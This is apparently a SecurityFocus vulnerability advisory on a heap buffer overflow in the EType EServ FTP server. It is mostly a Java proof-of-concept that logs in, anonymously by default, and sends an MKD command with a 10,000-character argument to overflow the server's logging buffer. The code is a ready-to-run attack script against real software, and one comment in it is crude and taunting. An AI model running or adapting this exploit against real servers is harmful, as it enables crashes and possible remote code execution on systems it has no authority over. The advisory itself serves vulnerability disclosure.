source: http://www.securityfocus.com/bid/1315/info

EType EServ is a combination mail, news, HTTP, FTP, and proxy server.

The logging mechanism in EType EServ is vulnerable to a heap buffer overflow that could allow remote attackers to execute arbitrary code on the server. The overflow occurs when a MKD command with an unusually long argument is sent to the FTP Server port. 

/* Proof of concept code for the heap overflow in EServ <= 2.9.2
 * Written 10/05/2000 by Andrew Lewis aka. Wizdumb [MDMA]
 */

import java.io.*;
import java.net.*;

class eservheap {

public static void main(String[] args) throws IOException {

  if (args.length < 1) {
    System.out.println("Syntax: java eservheap [host] <user> <pass>");
    System.exit(1); }

  Socket soq = null;
  PrintWriter white = null;
  BufferedReader weed = null;

  try {
    soq = new Socket(args[0], 21);
    white = new PrintWriter(soq.getOutputStream(), true);
    weed = new BufferedReader(new
InputStreamReader(soq.getInputStream()));
  } catch (Exception e) {
    System.out.println("Problems connecting :-/");
    System.exit(1); }

  weed.readLine();
  String juzer = (args.length == 3) ? ("USER " + args[1]) : "USER
anonymous";
  String pasz =  (args.length == 3) ? ("PASS " + args[2]) : "PASS mdma";
  white.println(juzer + "\n" + pasz);
  weed.readLine();
  weed.readLine();

  white.print("MKD ");
  for (int i = 0; i < 10000; i++) white.print("A");
  white.println(); // uNf! Who yoh daddy, bitch?
  weed.readLine();
  white.println("QUIT"); } }